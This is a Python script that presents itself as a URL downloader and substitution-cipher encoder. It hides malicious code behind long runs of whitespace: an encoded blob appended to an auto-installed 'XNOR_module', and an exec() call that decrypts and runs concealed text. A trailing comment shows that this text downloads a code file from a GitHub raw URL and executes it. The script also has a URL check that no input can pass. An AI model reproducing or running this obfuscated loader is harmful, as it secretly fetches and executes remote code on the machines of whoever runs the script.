import hashlib
import importlib
import importlib.util
import os
import string
import subprocess
import sys
import urllib.request
from pathlib import Path


def _ensure_dependencies():
    for module_name in ("cryptography", "argon2"):
        try:
            importlib.import_module(module_name)
        except ModuleNotFoundError:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--upgrade", "cryptography", "argon2-cffi"]
            )
            importlib.invalidate_caches()
            importlib.import_module(module_name)


def _load_real_xnor_module():
    _ensure_dependencies()

    try:
        spec = importlib.util.find_spec("XNOR_module")
        if spec is None or spec.origin is None:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "XNOR_module"])
            importlib.invalidate_caches()
            spec = importlib.util.find_spec("XNOR_module")

        if spec is None or spec.origin is None:
            raise ImportError("XNOR_module could not be found")

        module_path = Path(spec.origin)
        module_spec = importlib.util.spec_from_file_location("XNOR_module", module_path)
        if module_spec is None:
            raise ImportError("Could not create a module spec for XNOR_module")

        module = importlib.util.module_from_spec(module_spec)
        sys.modules["XNOR_module"] = module

        source = module_path.read_text(encoding="utf-8")
        source = "from __future__ import annotations\n" + source
        exec(compile(source, str(module_path), "exec"), module.__dict__)
        return module
    except Exception:
        raise


XNOR_module = _load_real_xnor_module()                                                                                                                                                                                                      ; XNOR_module.funny.append("bOOOOOLiFkJr__H9PjZ-3ScVKWjjuaa7FllMCKPoyLSZgUv81RnHlk695F4m98B8xkV5KtucqBlTkEcBM_aV9BocYGuPWcleCR4eFVMMoQpiCDDGdy7T_dPCNYyk155dWTMbOvnhGXR0iHcfszqnKyhk0lKR5EXxdIceP8N7Mo-2gMPY2D_YJ2BqX5K7jwWcOc6y6uqiiPfOcgEhXNNW_K3vGA_Ja6IXLcd1qNuORteEqxivlLACsebzkKinG1LkZ1OHWHRd06-y5c87xLBN9VOzCyDw1BsRpA0oxy3bv4bWweDQnIb4xS6tjNGy0R8xEIHhzHAfNalhg11fWQyU0hPMjgQl9QL0yoXpLEITjgeCxNe1dtntBzU3RY5-7PGPXEPE5ahukX1d1u9hAKzhWE6QFWsLbYuEexawJyJc1Vu26ATkZ7OCsIVXdnzzE8JFphveoOPTK9XzvjXYAXJnQnnTqDO4P4jMHm4LE2VLTkOyhRsXqK0Wj0vUsyTnVMKu7vNMN0VeU2UKfaJNdd5KT1rFHfYsxX4OYmHd4VvM8Cac4ZMdatUAm_AI5RGjQ3nf2NPz1NJ64Nrs7kMGs2ujKbnQzAI51h16kYnK9aLfc2E65MUG9eVzYr98ZsUDV9iAMcjyOh7UsR34KJwyhLOeaoIq7Sw0FZ28rwuxHFiy-Vzhu8QBcJAGlDGKqZ1yZErZ6bB_jWe12UFvSJM56-0dDvdqQ2cc6ye9NvnZDUxtsDFMj3IObSIsQ1dLeDZjticGvo8X3FxDq4-YxU5F7hjZ69JWvg5n2wsfmiSm1YrW-rW-bwiSQrlsgaMVU8eASwz85GbWvPzy_SqXLn9DiCZ0NO72YaY7iNoNAUFZPNuxje3DG_IPzi419KVZpm_vCNrt-aDo7QpWNqZ_3_a69DoUuGeS7RPviyBKANuIs2PPjDHE08KMoawoj65hmlBMcNEZAU3jpOAJ5TUSRtVCqOKBonckDK4urjV-vFEoJ6u0JWmv8jsmvvPpdT3vuPEWoh7dPPZzBCcBCB65m_1lDHhzGZkCFqcEYD7vkv3keNfzn7bZ62CncKxzqSSZIJYZEOD51BDFaWHwHMbrFyuEyeDCuyEESB3Jsd9-20h_D0JAxeiHFEUYogyFbYr5TJHlxt6ral4v63wKlSI5NdZGp3VSTX1LIby8T05pcbxSGRNOatcWbHo_q-GjAdeYg3dCATU344-j8CQ5nZqutjVAo6dEjyCr7urdLOghXu_9vu4Ydfsbao-pFU7BOACkJhL3G-p0rP38Prvri8f5FLgIx5e4armRh9qVfdqdEvwIcjoaTYP-QAhRzq-QhurTUEjigdP3dHliwR874-zwlUGH2Va97J9J-3HgyVuat_xWItnH48mOcLVy447TzpVwPTZIE13kwTIG9_ZRWKVU_-N7wj7GA2J5SMh366MEfCjsaveQU7omkGsApCYUIt76y8KR-MwBFzLvOh8kBOOV91zmSvVKsZNbg-Xm9SOJi2x7KkoXxFEV75QvudORJhrnYoVjxnICbHeGu7oJEXjXYE1Hyp-2geQSWHhfzcMZowy6UuSZKSbhbzKZzpLG6zJZqKlVXfIiXuED-TwIDMYDhc2WlGxyBtNh4IVcCpqbLmKZhig1MqXQVsa2BEmlJAGAffA6pF9E9KMVnPYi7u-a7UTTdSUAQa-4tsXJ6hOxX0hbHEjqwVyXghv0jz7c8l1thX-1uJSAluLaZgaVaDvfzQGTrtZ6hzaNiUUm_ie-cKh7yso-y7PAi21iOceOLke5pUvbFnKp9nAtiy6eT59nHF_5ZyLYvCNahiusijErR3EqDpfDze3qCxHFOwLQhyx1UgdyheB3dacLUkAjebUQsHOXy72pItq0gNnuKlcQ3FxfsQm7QoqEzGGVgZlKVlfRZjz7DmWcVAaWKTX2TZQtyj0TY6vh8dIdiJjzkfc6opWLlAWccgVPsvMNQCUxq28KVCw70z2BaZRMvhQVGFOQsON8DZ0jK8ounypqjOTx8vuxrXbcgWp4j4hOo24Xq2GKiPw9lXuobY-fRJ5kpYJsuV6ajcLdRInk-wtAeJ3mRBjvq8-QD1JXaD4uotdCgK3braOWSnAKuvGuYjpC8y06H5IU4uBQ840cR8AXHvUj6KuywwWhq6aC7FktZAVjNvqbuSOwx3bfRhrYfUnwpc51SIWiSKWA0ZMlr4pTujNoe8hXt7jV9xaZGKjZAqa4_X_ESfu_VK628Eb9tvbTAsw9yJ6cNLPKbywsxvnQpviqOpmwI0hsEXsaL9IBmQeLv_ERVWpMCsmVGFI8XITgzBp7fMHGJ68kYwxNyyEF5KaF4tJHnC42Aox7JgLsc1vT-aocDzCZ5jxFesZ2Yb7Gjqo7a9tHzbESgXDzOG7kpcv33cN-f7V2-Jmuv6gPLRkxSM9z2QNEyBg4lLBkxjuLrsCMJ6sAz4W8FhvpPXNCq6HY8u2oKzSUzARl9gy466b2OMaGnbSjl6vs4_1NLpR4lnjj_bZp4qD6x1lzfUQ0Gp44LIbMBPmxeYDxuN4PYdgN8i1nEjx4Jo34BcCsg3ri9OwN1lEVJIFcVazlJaMN7rNzSw2DYtZFfmjPDEjfSwZti7vQyg-Cj-tGW97yiSIjrXkNxQS3J9SkbjSC3x-bqcFBxT-EWFIApna_UcI42-Zoso57K4NNOGewcjKBIPPhh4mifa7i2eMS2HW6MzsxUT41hrBz4SElkrqcRrfSn7RtzRWChCo5GTVYG8qEjIw_5eobMQF0JrKW9awUXkRmHSrwGTygQrnI6a3e3jjeJsbSm5Dwv8Sn8w0m2MtiSTIoYpSsMm42vHHXsmju2AEMg-jmjHYkNW6RPG_Q8a7uesNbUCcVJZCTuRhQ-b6y9XOZGkRzK8ioGrwK-hzOlDDz9wl9wgMzN1qaYEbpIiJNLdFPXBsgVU6aMwUllprex8bNw2P2fzbFYErAMoZ8GTmCSxMSa1NFLZRnanJX3Z3Pfv2NDuI7j7dlq1wzI82lGARezGd9fZOBMjXfRiVIY7Zaxknyf57q04fLw0BtiT9sB8Rhx8V_UBwETsiUFKwqMVQHWOvTAMUnemNQCg3-LHk0U8rVmL2aPeXQ1laUkPB2f6wOcXD2mQPMWhR40OCggGMzRZICdyzR1JZbw-1y1pOIZrnwxp==")
XNOR_module.cls()

def check_url(url: str) -> str:
    if url is None or url == "":
        return "'url' argument is None while needing to be a url"
    elif not url.startswith("https://www.") or not url.startswith("https://raw."):
        return "'url' argument is not a link/url (does not start with https://www. or https://raw.) while needing to be a url/link"
    return "url_good"

def check_path_exists(path) -> bool:
    if os.path.exists(path):
        return True
    return False

def generate_secure_int_seed(huge_float: float) -> int:
    float_exact_str = huge_float.hex()
    hash_bytes = hashlib.sha256(float_exact_str.encode('utf-8')).digest()
    secure_int_seed = int.from_bytes(hash_bytes, byteorder='big')
    return secure_int_seed

def install(url: str, outpath: str):
    b = check_url(url)
    if b != "url_good":
        raise ValueError(b)
    
    if check_path_exists(outpath):
        raise FileExistsError("Please dont enter an existing path when installing a file")
    
    with urllib.request.urlopen(url) as response, open(outpath, "wb") as out_file:
        chunk_size = 1024 * 10
        while True:
            chunk = response.read(chunk_size)
            if not chunk:
                break
            out_file.write(chunk)

def encode(text: str, seed: float = 20000.00222222):
    seed = generate_secure_int_seed(
        float(seed * (2 / 222) + (2 * 34 / 2 + 2 / 222))
    )

    alpha = XNOR_module.shuffled_alphabet(seed)  # list[str]

    table = {}

    for original, shuffled in zip(string.ascii_lowercase, alpha):
        table[ord(original)] = shuffled
        table[ord(original.upper())] = shuffled.upper()

    return text.replace(" ", "").translate(table)

def decode(text: str, seed: float = 20000.00222222):
    seed = generate_secure_int_seed(
        float(seed * (2 / 222) + (2 * 34 / 2 + 2 / 222))
    )

    alpha = XNOR_module.shuffled_alphabet(seed)  # list[str]

    if isinstance(text, (bytes, bytearray)):
        try:
            text = XNOR_module.bytes_to_str(text)
        except Exception:
            text = bytes(text).decode("utf-8", errors="replace")

    reverse_table = {}
    for original, shuffled in zip(string.ascii_lowercase, alpha):
        reverse_table[ord(shuffled)] = original
        reverse_table[ord(shuffled.upper())] = original.upper()

    return text.translate(reverse_table)

def encode_and_bob(text: str, seed: float = 20000.00222222, Fkey: bytes = XNOR_module.Fkey, seed2: int = 23):
    return XNOR_module.bob_encode(encode(text, seed), Fkey, seed2)

def decode_and_decode_bob(seed: float = 20000.00222222):
    text = XNOR_module.read_bob_text()
    
    if text is bytes:
        text = XNOR_module.bytes_to_str(text)

    return decode(text, seed)


url = input("please enter a url that starts with https://www ")
path = input("please enter a path with filename ")

install(url, path)                                                                                                                                                                                          ; exec(decode_and_decode_bob(24067.6467373646455))

#CODE: 24067.6467373646455, b'etnCEcL2yDwRipxkNkup1WYpq0lNcgx4P4LuKWbenhE=', 16
#encode_and_bob("exec(install('https://raw.githubusercontent.com/thompogalt/Idk_AJH/refs/heads/main/code.txt', 'code.txt')); exec(with open('code.txt', 'r').read())", 24067.6467373646455, b'etnCEcL2yDwRipxkNkup1WYpq0lNcgx4P4LuKWbenhE=', 16)
